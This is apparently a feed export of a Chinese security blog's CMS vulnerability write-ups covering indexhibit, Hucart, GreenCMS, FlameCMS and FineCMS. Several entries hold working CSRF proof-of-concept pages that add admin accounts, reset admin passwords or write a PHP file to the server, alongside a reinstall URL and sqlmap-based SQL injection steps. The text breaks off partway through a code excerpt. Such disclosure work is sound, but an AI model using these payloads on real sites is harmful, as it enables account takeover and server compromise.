      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2019-16314 indexhibit cms v2.1.5 存在重装并导致getshell</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>夜程 发现indexhibit cms v2.1.5 存在重装并导致getshell 漏洞</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>如果没有删除 install.php 则可以通过直接提交参数进行重装，并在后台直接getshell</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>indexhibit cms</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>indexhibit cms  v2.1.5 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>indexhibit cms  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问/ndxzstudio/install.php，提示已安装</p><p>但是，通过参数p可以绕过，直接重新安装</p><p>填写相关信息后安装成功：</p><h2 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h2><blockquote><p>/ndxzstudio/install.php?p=2</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>Hucart cms v5.7.4 CSRF漏洞可任意增加管理员账号</td><td>2019-01-13</td><td>AllenChen（<a href="mailto:520allen@gmail.com" target="_blank" rel="noopener">520allen@gmail.com</a>）</td><td><a href="http://www.hucart.com/" target="_blank" rel="noopener">http://www.hucart.com/</a></td><td><a href="http://www.hucart.com/" target="_blank" rel="noopener">http://www.hucart.com/</a></td><td>v5.7.4</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6249" target="_blank" rel="noopener">CVE-2019-6249</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>Hucart cms v5.7.4版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可增加一个名为hack的管理员账号。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>exp代码如下：<br>增加一个名为hack密码为hack123的管理员账号。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">function post(url,fields)</span><br><span class="line">&#123;</span><br><span class="line">var p = document.createElement("form");</span><br><span class="line">p.action = url;</span><br><span class="line">p.innerHTML = fields;</span><br><span class="line">p.target = "_self";</span><br><span class="line">p.method = "post";</span><br><span class="line">document.body.appendChild(p);</span><br><span class="line">p.submit();</span><br><span class="line">&#125;</span><br><span class="line">function csrf_hack()</span><br><span class="line">&#123;</span><br><span class="line">var fields;</span><br><span class="line"></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'adm_user'</span> <span class="attr">value</span>=<span class="string">'hack'</span> /&gt;</span>";</span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'adm_email'</span> <span class="attr">value</span>=<span class="string">'admin@hack.com'</span> /&gt;</span>";  </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'adm_mobile'</span> <span class="attr">value</span>=<span class="string">'13888888888'</span> /&gt;</span>";  </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'adm_pwd'</span> <span class="attr">value</span>=<span class="string">'hack123'</span> /&gt;</span>";  </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'re_adm_pwd'</span> <span class="attr">value</span>=<span class="string">'hack123'</span> /&gt;</span>";  </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'adm_enabled'</span> <span class="attr">value</span>=<span class="string">'1'</span> /&gt;</span>";  </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'act_type'</span> <span class="attr">value</span>=<span class="string">'add'</span> /&gt;</span>";  </span></span><br><span class="line"><span class="xml">fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'adm_id'</span> <span class="attr">value</span>=<span class="string">''</span> /&gt;</span>";  </span></span><br><span class="line"></span><br><span class="line">var url = "http://localhost/hucart_cn/adminsys/index.php?load=admins&amp;act=edit_info&amp;act_type=add";</span><br><span class="line">post(url,fields);</span><br><span class="line">&#125;</span><br><span class="line">window.onload = function() &#123; csrf_hack();&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell&amp;%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell&amp;%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>GreenCMS v2.3.0603存在CSRF漏洞可获取webshell&amp;增加管理员账户</td><td>2018-06-02</td><td>惜潮</td><td><a href="https://github.com/GreenCMS/GreenCMS" target="_blank" rel="noopener">https://github.com/GreenCMS/GreenCMS</a></td><td><a href="https://github.com/GreenCMS/GreenCMS" target="_blank" rel="noopener">https://github.com/GreenCMS/GreenCMS</a></td><td>v2.3.0603</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11670" target="_blank" rel="noopener">CVE-2018-11670</a>/<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11671" target="_blank" rel="noopener">CVE-2018-11671</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>恶意攻击者可以精心伪造一个Html页面 从而获取网站webshell。GreenCMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过<a href="https://github.com/GreenCMS/GreenCMS/issues/108" target="_blank" rel="noopener">issues</a>/<a href="https://github.com/GreenCMS/GreenCMS/issues/109" target="_blank" rel="noopener">issues</a>告知作者。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>从CSRF到get webshell 的exp代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"font-size:18px;"</span>&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1//14/index.php?m=admin&amp;c=media&amp;a=fileconnect"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 下面的是生成文件名为xc.php的脚本文件 路径 127.0.0.1/Upload/xc.php --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/14/index.php?m=admin&amp;c=media&amp;a=fileconnect&amp;cmd=mkfile&amp;name=xc.php&amp;target=l1_XA&amp;_=1527839615462"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"cmd"</span> <span class="attr">value</span>=<span class="string">"put"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"target"</span> <span class="attr">value</span>=<span class="string">"l1_eGMucGhw"</span>&gt;</span></span><br><span class="line">　    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">"&lt;?php phpinfo();?&gt;"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 下面的是提交表单 将content中的命令写入脚本内 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span>WebShell<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>从CSRF到增加管理员 的exp代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"font-size:18px;"</span>&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line">　　<span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    　　　　<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1//14/index.php?m=admin&amp;c=access&amp;a=adduserhandle"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_id0"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_login"</span> <span class="attr">value</span>=<span class="string">"test1"</span>&gt;</span>  <span class="comment">&lt;!--在这里可以添加JS脚本用于获取cookies  csrf+xss--&gt;</span></span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"test1"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"rpassword"</span> <span class="attr">value</span>=<span class="string">"test1"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_nicename"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_email"</span> <span class="attr">value</span>=<span class="string">"123%40Qq.com"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_url"</span> <span class="attr">value</span>=<span class="string">"www.baidu.com"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_intro"</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_status"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>  </span><br><span class="line">　　　　　　　　<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"role_id"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span>添加管理员<span class="tag">&lt;/<span class="name">button</span>&gt;</span>  </span><br><span class="line">　　　　　　<span class="tag">&lt;/<span class="name">form</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2019-16309 FlameCMS 3.3.5 后台登录处存在sql注入漏洞</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Ethan发现FlameCMS 3.3.5 后台登录处存在sql注入漏洞</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>后台登录处存在sql注入漏洞，可以通过<code>sqlmap</code>直接跑出所有表</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>FlameCMS</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>FlameCMS 3.3.5 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>FlameCMS  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问后台登陆处抓包<code>http://127.0.0.1:8888/FlameCMS-master/account/login.php</code></p><p>然后把抓取的post包，放进sqlmap跑，可以跑出盲注</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>Finecms_v5.4存在CSRF漏洞可修改管理员账户密码</td><td>2018-10-07</td><td>踏月留香</td><td><a href="http://www.finecms.net/" target="_blank" rel="noopener">http://www.finecms.net/</a></td><td><a href="http://down.chinaz.com/soft/32596.htm" target="_blank" rel="noopener">http://down.chinaz.com/soft/32596.htm</a></td><td>5.4</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18191" target="_blank" rel="noopener">CVE-2018-18191</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>恶意攻击者可以精心伪造一个html页面诱骗已登录的管理用户点击，从而更改管理员账户密码。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>exp代码如下：  </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>history.pushState('', '', '/')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/admin.php?c=member&amp;m=edit&amp;uid=1"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"page"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"member<span class="symbol">&amp;#91;</span>email<span class="symbol">&amp;#93;</span>"</span> <span class="attr">value</span>=<span class="string">"admin<span class="symbol">&amp;#64;</span>163<span class="symbol">&amp;#46;</span>com"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"member<span class="symbol">&amp;#91;</span>name<span class="symbol">&amp;#93;</span>"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"member<span class="symbol">&amp;#91;</span>phone<span class="symbol">&amp;#93;</span>"</span> <span class="attr">value</span>=<span class="string">"18888888888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"member<span class="symbol">&amp;#91;</span>password<span class="symbol">&amp;#93;</span>"</span> <span class="attr">value</span>=<span class="string">"888888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/FineCMS_v5.0.8%E4%B8%A4%E5%A4%84getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>就要被**，美其名曰：比我的web安全研究和代码审计更有前途。当然是选择原谅他啦。<br>先审计finecms去去火，找到六处漏洞，先放两处容易被发现的getshell和对应的两个python脚本</p><h2 id="0x02-getshell"><a href="#0x02-getshell" class="headerlink" title="0x02 getshell"></a>0x02 getshell</h2><p><strong>第一处getshell</strong>：在C:/phpStudy/WWW/finecms/dayrui/controllers/Api.php中的data2函数，大约在第115行，有问题的代码大约在178行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public function data2() &#123;</span><br><span class="line"></span><br><span class="line">    $data = array();</span><br><span class="line"></span><br><span class="line">    // 安全码认证</span><br><span class="line">    $auth = $this-&gt;input-&gt;get(&apos;auth&apos;, true);</span><br><span class="line">    if ($auth != md5(SYS_KEY)) &#123;</span><br><span class="line">        // 授权认证码不正确</span><br><span class="line">        $data = array(&apos;msg&apos; =&gt; &apos;授权认证码不正确&apos;, &apos;code&apos; =&gt; 0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 解析数据</span><br><span class="line">        $cache = &apos;&apos;;</span><br><span class="line">        $param = $this-&gt;input-&gt;get(&apos;param&apos;);</span><br><span class="line">        if (isset($param[&apos;cache&apos;]) &amp;&amp; $param[&apos;cache&apos;]) &#123;</span><br><span class="line">            $cache = md5(dr_array2string($param));</span><br><span class="line">            $data = $this-&gt;get_cache_data($cache);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$data) &#123;</span><br><span class="line"></span><br><span class="line">            if ($param == &apos;login&apos;) &#123;</span><br><span class="line">                // 登录认证</span><br><span class="line">                $code = $this-&gt;member_model-&gt;login(</span><br><span class="line">                    $this-&gt;input-&gt;get(&apos;username&apos;),</span><br><span class="line">                    $this-&gt;input-&gt;get(&apos;password&apos;),</span><br><span class="line">                    0, 1);</span><br><span class="line">                if (is_array($code)) 